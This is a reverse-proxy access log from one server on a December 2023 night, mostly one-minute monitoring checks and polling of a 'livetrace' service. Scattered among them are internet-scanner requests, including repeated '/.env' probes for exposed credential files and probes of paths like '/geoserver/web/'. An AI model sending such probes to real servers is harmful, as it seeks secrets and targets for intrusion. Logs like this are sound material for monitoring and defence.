167.71.120.76 - - [14/Dec/2023:02:27:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 183 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:02:28:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 184 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:02:28:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 185 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:02:29:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 186 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:02:29:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 187 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:02:30:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 188 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:02:30:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 189 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:02:31:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 190 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:02:31:40 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 191 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:02:32:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 192 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:02:32:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 193 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:02:33:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 194 "www@docker" "http://172.25.0.8:80" 1ms
195.170.172.128 - - [14/Dec/2023:02:33:36 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 195 "-" "-" 0ms
167.71.120.76 - - [14/Dec/2023:02:33:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 196 "www@docker" "http://172.25.0.8:80" 1ms
195.170.172.128 - - [14/Dec/2023:02:33:39 +0000] "POST / HTTP/1.1" 404 19 "-" "-" 197 "-" "-" 0ms
195.170.172.128 - - [14/Dec/2023:02:33:42 +0000] "POST / HTTP/1.1" 404 19 "-" "-" 198 "-" "-" 0ms
195.170.172.128 - - [14/Dec/2023:02:33:46 +0000] "GET /WuEL HTTP/1.1" 404 19 "-" "-" 199 "-" "-" 0ms
195.170.172.128 - - [14/Dec/2023:02:33:53 +0000] "GET /a HTTP/1.1" 404 19 "-" "-" 200 "-" "-" 0ms
195.170.172.128 - - [14/Dec/2023:02:33:57 +0000] "GET /download/file.ext HTTP/1.1" 404 19 "-" "-" 201 "-" "-" 0ms
195.170.172.128 - - [14/Dec/2023:02:34:01 +0000] "GET /SiteLoader HTTP/1.1" 404 19 "-" "-" 202 "-" "-" 0ms
195.170.172.128 - - [14/Dec/2023:02:34:04 +0000] "GET /mPlayer HTTP/1.1" 404 19 "-" "-" 203 "-" "-" 0ms
195.170.172.128 - - [14/Dec/2023:02:34:08 +0000] "POST / HTTP/1.1" 404 19 "-" "-" 204 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:02:34:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 205 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:02:34:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 206 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:02:35:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 207 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:02:35:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 208 "www@docker" "http://172.25.0.8:80" 0ms
162.216.150.140 - - [14/Dec/2023:02:35:54 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 209 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:02:36:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 210 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:02:36:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 211 "www@docker" "http://172.25.0.8:80" 1ms
158.51.121.113 - - [14/Dec/2023:02:36:41 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 212 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:02:37:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 213 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:02:37:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 214 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:02:38:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 215 "www@docker" "http://172.25.0.8:80" 0ms
8.222.253.90 - - [14/Dec/2023:02:38:33 +0000] "POST /dns-query HTTP/2.0" 404 19 "-" "-" 216 "-" "-" 0ms
167.71.120.76 - - [14/Dec/2023:02:38:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 217 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:02:39:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 218 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:02:39:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 219 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:02:40:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 220 "www@docker" "http://172.25.0.8:80" 0ms
95.214.235.169 - - [14/Dec/2023:02:40:26 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 221 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [14/Dec/2023:02:40:28 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 222 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [14/Dec/2023:02:40:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 223 "www@docker" "http://172.25.0.8:80" 1ms
103.149.192.254 - - [14/Dec/2023:02:40:58 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 224 "web-to-websecure@internal" "-" 0ms
103.149.192.187 - - [14/Dec/2023:02:40:59 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 225 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:02:41:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 226 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:02:41:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 227 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:02:42:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 228 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:02:42:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 229 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:02:43:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 230 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:02:43:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 231 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:02:44:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 232 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:02:44:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 233 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:02:45:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 234 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:02:45:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 235 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:02:46:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 236 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:02:46:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 237 "www@docker" "http://172.25.0.8:80" 0ms
184.105.247.196 - - [14/Dec/2023:02:46:53 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 238 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:02:47:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 239 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:02:47:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 240 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:02:48:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 241 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:02:48:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 242 "www@docker" "http://172.25.0.8:80" 0ms
184.105.247.196 - - [14/Dec/2023:02:48:55 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 243 "web-to-websecure@internal" "-" 0ms
184.105.247.196 - - [14/Dec/2023:02:48:56 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 244 "-" "-" 0ms
184.105.247.196 - - [14/Dec/2023:02:49:21 +0000] "GET /favicon.ico HTTP/1.1" 301 17 "-" "-" 245 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:02:49:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 246 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:02:49:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 247 "www@docker" "http://172.25.0.8:80" 0ms
107.170.236.29 - - [14/Dec/2023:02:50:00 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 248 "-" "-" 0ms
184.105.247.196 - - [14/Dec/2023:02:50:07 +0000] "GET /geoserver/web/ HTTP/1.1" 301 17 "-" "-" 249 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:02:50:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 250 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:02:50:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 251 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:02:51:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 252 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:02:51:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 253 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:02:52:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 254 "www@docker" "http://172.25.0.8:80" 0ms
170.130.187.46 - - [14/Dec/2023:02:52:35 +0000] "GET / HTTP/1.0" 404 19 "-" "-" 255 "-" "-" 0ms
167.71.120.76 - - [14/Dec/2023:02:52:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 256 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:02:53:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 257 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:02:53:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 258 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:02:54:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 259 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:02:54:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 260 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:02:55:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 261 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:02:55:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 262 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:02:56:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 263 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:02:56:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 264 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:02:57:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 265 "www@docker" "http://172.25.0.8:80" 0ms
170.130.187.46 - - [14/Dec/2023:02:57:30 +0000] "GET / HTTP/1.0" 404 19 "-" "-" 266 "-" "-" 0ms
167.71.120.76 - - [14/Dec/2023:02:57:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 267 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:02:58:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 268 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:02:58:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 269 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:02:59:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 270 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:02:59:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 271 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:03:00:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 272 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:03:00:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 273 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:03:01:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 274 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:03:01:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 275 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:03:02:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 276 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:03:02:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 277 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:03:03:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 278 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:03:03:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 279 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:03:04:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 280 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:03:04:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 281 "www@docker" "http://172.25.0.8:80" 0ms
143.110.222.166 - - [14/Dec/2023:03:04:45 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 282 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:03:05:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 283 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:03:05:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 284 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:03:06:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 285 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:03:06:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 286 "www@docker" "http://172.25.0.8:80" 0ms
34.76.158.233 - - [14/Dec/2023:03:06:49 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 287 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:03:07:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 288 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:03:07:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 289 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:03:08:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 290 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:03:08:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 291 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:03:09:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 292 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:03:09:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 293 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:03:10:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 294 "www@docker" "http://172.25.0.8:80" 0ms
68.69.186.30 - - [14/Dec/2023:03:10:27 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 295 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [14/Dec/2023:03:10:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 296 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:03:11:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 297 "www@docker" "http://172.25.0.8:80" 0ms
65.153.45.109 - - [14/Dec/2023:03:11:26 +0000] "GET /trace/start.php?id=78wcnjb5u HTTP/2.0" 200 86 "-" "-" 298 "livetrace@docker" "http://172.25.0.5:80" 40ms
65.153.45.109 - - [14/Dec/2023:03:11:28 +0000] "GET /trace/poll.php?id=78wcnjb5u HTTP/2.0" 200 130 "-" "-" 299 "livetrace@docker" "http://172.25.0.5:80" 2ms
65.153.45.109 - - [14/Dec/2023:03:11:29 +0000] "GET /trace/poll.php?id=78wcnjb5u HTTP/2.0" 200 187 "-" "-" 300 "livetrace@docker" "http://172.25.0.5:80" 1ms
65.153.45.109 - - [14/Dec/2023:03:11:31 +0000] "GET /trace/poll.php?id=78wcnjb5u HTTP/2.0" 200 301 "-" "-" 301 "livetrace@docker" "http://172.25.0.5:80" 1ms
65.153.45.109 - - [14/Dec/2023:03:11:32 +0000] "GET /trace/poll.php?id=78wcnjb5u HTTP/2.0" 200 358 "-" "-" 302 "livetrace@docker" "http://172.25.0.5:80" 1ms
65.153.45.109 - - [14/Dec/2023:03:11:33 +0000] "GET /trace/poll.php?id=78wcnjb5u HTTP/2.0" 200 415 "-" "-" 303 "livetrace@docker" "http://172.25.0.5:80" 1ms
65.153.45.109 - - [14/Dec/2023:03:11:34 +0000] "GET /trace/poll.php?id=78wcnjb5u HTTP/2.0" 200 472 "-" "-" 304 "livetrace@docker" "http://172.25.0.5:80" 1ms
65.153.45.109 - - [14/Dec/2023:03:11:35 +0000] "GET /trace/poll.php?id=78wcnjb5u HTTP/2.0" 200 529 "-" "-" 305 "livetrace@docker" "http://172.25.0.5:80" 1ms
65.153.45.109 - - [14/Dec/2023:03:11:36 +0000] "GET /trace/poll.php?id=78wcnjb5u HTTP/2.0" 200 540 "-" "-" 306 "livetrace@docker" "http://172.25.0.5:80" 1ms
167.71.120.76 - - [14/Dec/2023:03:11:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 307 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:03:12:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 308 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:03:12:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 309 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:03:13:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 310 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:03:13:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 311 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:03:14:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 312 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:03:14:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 313 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:03:15:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 314 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:03:15:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 315 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:03:16:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 316 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:03:16:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 317 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:03:17:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 318 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:03:17:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 319 "www@docker" "http://172.25.0.8:80" 7ms
159.203.109.206 - - [14/Dec/2023:03:18:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 320 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:03:18:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 321 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:03:19:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 322 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:03:19:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 323 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:03:20:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 324 "www@docker" "http://172.25.0.8:80" 0ms
143.110.222.166 - - [14/Dec/2023:03:20:34 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 325 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [14/Dec/2023:03:20:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 326 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:03:21:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 327 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:03:21:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 328 "www@docker" "http://172.25.0.8:80" 0ms
8.222.253.90 - - [14/Dec/2023:03:21:43 +0000] "GET /dns-query?dns=wkkBAAABAAAAAAAABmdvb2dsZQNjb20AAAEAAQ HTTP/2.0" 404 19 "-" "-" 329 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:03:22:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 330 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:03:22:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 331 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:03:23:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 332 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:03:23:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 333 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:03:24:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 334 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:03:24:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 335 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:03:25:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 336 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:03:25:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 337 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:03:26:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 338 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:03:26:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 339 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:03:27:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 340 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:03:27:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 341 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:03:28:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 342 "www@docker" "http://172.25.0.8:80" 0ms
104.140.188.6 - - [14/Dec/2023:03:28:26 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 343 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [14/Dec/2023:03:28:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 344 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:03:29:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 345 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:03:29:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 346 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:03:30:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 347 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:03:30:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 348 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:03:31:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 349 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:03:31:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 350 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:03:32:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 351 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:03:32:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 352 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:03:33:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 353 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:03:33:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 354 "www@docker" "http://172.25.0.8:80" 1ms
78.153.140.219 - - [14/Dec/2023:03:33:46 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 355 "-" "-" 0ms
78.153.140.219 - - [14/Dec/2023:03:33:46 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 356 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:03:34:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 357 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:03:34:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 358 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:03:35:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 359 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:03:35:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 360 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:03:36:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 361 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:03:36:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 362 "www@docker" "http://172.25.0.8:80" 0ms
65.153.45.109 - - [14/Dec/2023:03:37:20 +0000] "GET /trace/index.html HTTP/2.0" 200 411 "-" "-" 363 "livetrace@docker" "http://172.25.0.5:80" 1ms
65.153.45.109 - - [14/Dec/2023:03:37:20 +0000] "GET /trace/styles.css HTTP/2.0" 200 598 "-" "-" 364 "livetrace@docker" "http://172.25.0.5:80" 1ms
65.153.45.109 - - [14/Dec/2023:03:37:20 +0000] "GET /trace/script.js HTTP/2.0" 200 1120 "-" "-" 365 "livetrace@docker" "http://172.25.0.5:80" 0ms
65.153.45.109 - - [14/Dec/2023:03:37:20 +0000] "GET /trace/start.php?id=rgtzy2xmq HTTP/2.0" 200 86 "-" "-" 366 "livetrace@docker" "http://172.25.0.5:80" 3ms
